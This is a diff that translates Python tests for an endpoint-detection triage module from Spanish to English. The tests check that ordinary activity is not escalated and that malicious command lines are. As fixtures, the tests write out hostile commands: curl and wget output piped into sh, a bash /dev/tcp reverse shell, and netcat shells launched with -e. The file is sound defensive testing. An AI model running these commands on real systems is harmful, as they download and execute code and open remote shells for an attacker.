@@ -1,13 +1,13 @@
-"""Tests del triaje determinista.
+"""Tests for the deterministic triage.
 
-Lo que se comprueba aquí no es sólo que las reglas disparen, sino sobre todo que
-**no** disparen con actividad corriente. Un triaje que escala de más devuelve el
-sistema al problema que venía a resolver: el prompt se llena de ruido y el modelo
-razona peor, no mejor.
+What matters here is not only that the rules fire, but above all that they do
+**not** fire on ordinary activity. A triage that over-escalates puts the system
+back where it started: the prompt fills with noise and the model reasons worse,
+not better.
 
-Los casos benignos salen de actividad medida en esta máquina, no inventada: VS
-Code sondeando `git`, Docker lanzando `runc`, y peticiones a Ollama en
-`127.0.0.1:11434`.
+The benign cases come from activity measured on this machine, not invented: VS
+Code polling `git`, Docker launching `runc`, and requests to Ollama on
+127.0.0.1:11434.
 """
 
 import pytest
@@ -20,9 +20,9 @@ def ev(filename, cmdline="", kind=None):
             "kind": kind or config.KIND_EXECVE}
 
 
-# ── Actividad corriente: no debe escalar ───────────────────────
+# ── Ordinary activity: must not escalate ───────────────────────
 
-@pytest.mark.parametrize("evento", [
+@pytest.mark.parametrize("event", [
     ev("/usr/bin/grep", "-r foo"),
     ev("/usr/bin/git", "status --porcelain"),
     ev("/usr/bin/runc", "--root /var/run/docker/runtime-runc/moby"),
@@ -30,159 +30,159 @@ def ev(filename, cmdline="", kind=None):
     ev("/bin/sh", "-c ls -la"),
     ev("/usr/bin/python3", "orchestrator.py"),
 ])
-def test_la_actividad_corriente_no_escala(evento):
-    assert not triage.should_escalate(evento)
+def test_ordinary_activity_does_not_escalate(event):
+    assert not triage.should_escalate(event)
 
 
-def test_una_peticion_a_la_propia_infraestructura_no_escala():
-    """Regresión: una IP en crudo es señal, pero 127.0.0.1 es Ollama.
+def test_a_request_to_our_own_infrastructure_does_not_escalate():
+    """Regression: a raw IP is a signal, but 127.0.0.1 is Ollama.
 
-    La versión ingenua de la regla —"URL con IP literal"— se dispararía con cada
-    petición del propio EDR a su modelo. Se exige que la dirección sea además
-    encaminable por internet.
+    The naive version of the rule — "URL with a literal IP" — would fire on
+    every request the EDR makes to its own model. The address must also be
+    routable on the internet.
     """
     assert not triage.should_escalate(
         ev("/usr/bin/curl", "-s http://127.0.0.1:11434/api/tags"))
     assert not triage.should_escalate(
-        ev("/usr/bin/wget", "-q http://192.168.1.10/paquete.deb"))
+        ev("/usr/bin/wget", "-q http://192.168.1.10/package.deb"))
 
 
-def test_las_direcciones_de_documentacion_tampoco_cuentan():
-    """`is_global` excluye también los rangos reservados de la RFC 5737.
+def test_documentation_addresses_do_not_count_either():
+    """`is_global` also excludes the RFC 5737 reserved ranges.
 
-    Conviene tenerlo presente al montar una demo: la IP de ejemplo de manual
-    (198.51.100.x) NO dispara la regla, hace falta una dirección real.
+    Worth remembering when building a demo: the textbook example address
+    (198.51.100.x) does NOT fire the rule, a real one is needed.
     """
     assert not triage.should_escalate(
         ev("/usr/bin/curl", "-s http://198.51.100.7/x.sh"))
 
 
-def test_un_evento_vacio_no_escala():
+def test_an_empty_event_does_not_escalate():
     assert triage.assess({}) == (0, [])
     assert triage.assess({"filename": "", "cmdline": ""}) == (0, [])
 
 
-# ── Cada regla, por separado ───────────────────────────────────
+# ── Each rule on its own ───────────────────────────────────────
 
-def test_ejecucion_desde_un_directorio_escribible_por_cualquiera():
-    for ruta in ("/tmp/x", "/var/tmp/x", "/dev/shm/x", "/run/shm/x"):
-        _, reglas = triage.assess(ev(ruta))
-        assert "exec_from_world_writable" in reglas, ruta
-
-
-def test_binario_oculto():
-    _, reglas = triage.assess(ev("/home/ivan/.cache/.x"))
-    assert "hidden_binary" in reglas
-
-    # Un directorio oculto en la ruta no cuenta: lo que importa es el binario.
-    _, reglas = triage.assess(ev("/home/ivan/.local/bin/herramienta"))
-    assert "hidden_binary" not in reglas
+def test_execution_from_a_world_writable_directory():
+    for path in ("/tmp/x", "/var/tmp/x", "/dev/shm/x", "/run/shm/x"):
+        _, rules = triage.assess(ev(path))
+        assert "exec_from_world_writable" in rules, path
 
 
-def test_tuberia_a_un_shell():
-    for orden in ("-c curl http://x/y | sh",
-                  "-c wget -O - http://x/y|bash",
-                  "-c cat x | /bin/sh"):
-        _, reglas = triage.assess(ev("/bin/bash", orden))
-        assert "pipe_to_shell" in reglas, orden
+def test_hidden_binary():
+    _, rules = triage.assess(ev("/home/ivan/.cache/.x"))
+    assert "hidden_binary" in rules
+
+    # A hidden directory in the path does not count: the binary is what matters.
+    _, rules = triage.assess(ev("/home/ivan/.local/bin/tool"))
+    assert "hidden_binary" not in rules
 
 
-def test_descarga_directa_a_un_shell():
-    _, reglas = triage.assess(ev("/bin/bash", "-c curl -s http://x/y.sh | sh"))
-    assert "downloader_to_shell" in reglas
+def test_pipe_to_shell():
+    for command in ("-c curl http://x/y | sh",
+                    "-c wget -O - http://x/y|bash",
+                    "-c cat x | /bin/sh"):
+        _, rules = triage.assess(ev("/bin/bash", command))
+        assert "pipe_to_shell" in rules, command
 
 
-def test_descarga_desde_una_ip_publica_en_crudo():
-    _, reglas = triage.assess(ev("/usr/bin/curl", "-s http://1.1.1.1/x.sh"))
-    assert "download_from_public_ip" in reglas
-
-    # Un dominio no es señal: es lo normal.
-    _, reglas = triage.assess(ev("/usr/bin/curl", "-s http://ejemplo.com/x.sh"))
-    assert "download_from_public_ip" not in reglas
+def test_download_piped_straight_into_a_shell():
+    _, rules = triage.assess(ev("/bin/bash", "-c curl -s http://x/y.sh | sh"))
+    assert "downloader_to_shell" in rules
 
 
-def test_shell_redirigido_a_un_socket():
-    """La reverse shell canónica en bash, sin herramientas externas."""
-    _, reglas = triage.assess(
+def test_download_from_a_raw_public_ip():
+    _, rules = triage.assess(ev("/usr/bin/curl", "-s http://1.1.1.1/x.sh"))
+    assert "download_from_public_ip" in rules
+
+    # A domain name is not a signal: it is the normal case.
+    _, rules = triage.assess(ev("/usr/bin/curl", "-s http://example.com/x.sh"))
+    assert "download_from_public_ip" not in rules
+
+
+def test_shell_redirected_to_a_socket():
+    """The canonical bash reverse shell, without external tools."""
+    _, rules = triage.assess(
         ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"))
-    assert "shell_net_redirect" in reglas
+    assert "shell_net_redirect" in rules
 
 
-def test_netcat_ejecutando_un_programa():
-    for orden in ("-e /bin/sh 1.1.1.1 4444", "-lvnp 4444 -e /bin/bash"):
-        _, reglas = triage.assess(ev("/usr/bin/nc", orden))
-        assert "netcat_exec" in reglas, orden
+def test_netcat_executing_a_program():
+    for command in ("-e /bin/sh 1.1.1.1 4444", "-lvnp 4444 -e /bin/bash"):
+        _, rules = triage.assess(ev("/usr/bin/nc", command))
+        assert "netcat_exec" in rules, command
 
-    # netcat a secas es una herramienta legítima de diagnóstico.
-    _, reglas = triage.assess(ev("/usr/bin/nc", "-z 127.0.0.1 22"))
-    assert "netcat_exec" not in reglas
-
-
-# ── El umbral: una señal débil no basta, dos sí ────────────────
-
-def test_una_sola_senal_debil_no_alcanza_el_umbral():
-    """Compilar o ejecutar algo en /tmp es corriente y no debe despertar al modelo."""
-    severidad, reglas = triage.assess(ev("/tmp/build.sh"))
-    assert reglas == ["exec_from_world_writable"]
-    assert severidad < config.TRIAGE_THRESHOLD
+    # Plain netcat is a legitimate diagnostic tool.
+    _, rules = triage.assess(ev("/usr/bin/nc", "-z 127.0.0.1 22"))
+    assert "netcat_exec" not in rules
 
 
-def test_dos_senales_debiles_si_alcanzan_el_umbral():
-    """Ejecutar desde /tmp algo cuyo nombre empieza por punto ya no es corriente."""
-    severidad, reglas = triage.assess(ev("/tmp/.systemd-update", "600"))
-    assert set(reglas) == {"exec_from_world_writable", "hidden_binary"}
-    assert severidad >= config.TRIAGE_THRESHOLD
+# ── The threshold: one weak signal is not enough, two are ──────
+
+def test_one_weak_signal_does_not_reach_the_threshold():
+    """Building or running something in /tmp is ordinary and must not wake the model."""
+    severity, rules = triage.assess(ev("/tmp/build.sh"))
+    assert rules == ["exec_from_world_writable"]
+    assert severity < config.TRIAGE_THRESHOLD
 
 
-def test_las_dos_ordenes_de_la_demo_caen_a_lados_opuestos():
-    """Hoy generan el mismo evento; con la línea de órdenes son distinguibles."""
-    benigna = ev("/usr/bin/curl", "-s https://api.github.com/health")
-    maliciosa = ev("/bin/bash", "-c curl -s http://1.1.1.1/x.sh | sh")
-
-    assert not triage.should_escalate(benigna)
-    assert triage.should_escalate(maliciosa)
+def test_two_weak_signals_do_reach_the_threshold():
+    """Running something from /tmp whose name starts with a dot is not ordinary."""
+    severity, rules = triage.assess(ev("/tmp/.systemd-update", "600"))
+    assert set(rules) == {"exec_from_world_writable", "hidden_binary"}
+    assert severity >= config.TRIAGE_THRESHOLD
 
 
-def test_el_umbral_se_puede_mover_sin_tocar_codigo():
-    evento = ev("/tmp/build.sh")
-    assert not triage.should_escalate(evento)
-    assert triage.should_escalate(evento, threshold=10)
+def test_the_two_demo_commands_land_on_opposite_sides():
+    """Without the command line they produce the same event; with it they don't."""
+    benign = ev("/usr/bin/curl", "-s https://api.github.com/health")
+    malicious = ev("/bin/bash", "-c curl -s http://1.1.1.1/x.sh | sh")
+
+    assert not triage.should_escalate(benign)
+    assert triage.should_escalate(malicious)
 
 
-# ── Filtro de alertas ──────────────────────────────────────────
+def test_the_threshold_can_be_moved_without_touching_code():
+    event = ev("/tmp/build.sh")
+    assert not triage.should_escalate(event)
+    assert triage.should_escalate(event, threshold=10)
 
-def test_una_carga_de_modulo_siempre_es_alerta():
-    """Son privilegiadas, escasas, y el caso que el sistema ya trataba."""
+
+# ── Alert filtering ────────────────────────────────────────────
+
+def test_a_module_load_is_always_an_alert():
+    """Privileged, rare, and the case the system already handled."""
     assert triage.is_alert({"kind": config.KIND_MODULE_LOAD, "comm": "modprobe"})
 
 
-def test_un_exec_solo_es_alerta_por_encima_del_umbral():
+def test_an_execve_is_only_an_alert_above_the_threshold():
     assert triage.is_alert(
         {"kind": config.KIND_EXECVE, "severity": 70})
     assert not triage.is_alert(
         {"kind": config.KIND_EXECVE, "severity": 40})
 
 
-def test_un_exec_sin_severidad_se_evalua_al_vuelo():
-    """Red de seguridad para eventos que no pasaron por el sensor."""
+def test_an_execve_without_severity_is_scored_on_the_fly():
+    """Safety net for events that never went through the sensor."""
     assert triage.is_alert(ev("/tmp/.systemd-update", "600"))
     assert not triage.is_alert(ev("/usr/bin/grep", "-r foo"))
 
 
-def test_un_tipo_de_evento_desconocido_no_es_alerta():
-    """Los sensores de la fase 4 tendrán que declararse aquí explícitamente."""
-    assert not triage.is_alert({"kind": "futuro_sensor", "pid": 1})
+def test_an_unknown_event_kind_is_not_an_alert():
+    """Phase 4 sensors will have to declare themselves here explicitly."""
+    assert not triage.is_alert({"kind": "future_sensor", "pid": 1})
 
 
-# ── Estabilidad de los slugs ───────────────────────────────────
+# ── Slug stability ─────────────────────────────────────────────
 
-def test_cada_regla_tiene_peso_declarado():
-    """Un slug sin peso reventaría al sumar; y los slugs se agregan en el lab."""
-    reglas_emitidas = set()
-    for evento in (ev("/tmp/.x", "-c curl http://1.1.1.1/y | sh"),
-                   ev("/usr/bin/nc", "-e /bin/sh 1.1.1.1 4444"),
-                   ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444")):
-        reglas_emitidas.update(triage.assess(evento)[1])
+def test_every_rule_has_a_declared_weight():
+    """A slug with no weight would blow up on sum, and slugs feed the lab stats."""
+    emitted = set()
+    for event in (ev("/tmp/.x", "-c curl http://1.1.1.1/y | sh"),
+                  ev("/usr/bin/nc", "-e /bin/sh 1.1.1.1 4444"),
+                  ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444")):
+        emitted.update(triage.assess(event)[1])
 
-    assert reglas_emitidas <= set(triage.WEIGHTS)
-    assert reglas_emitidas, "los casos de prueba deberían disparar algo"
+    assert emitted <= set(triage.WEIGHTS)
+    assert emitted, "the test cases should fire something"
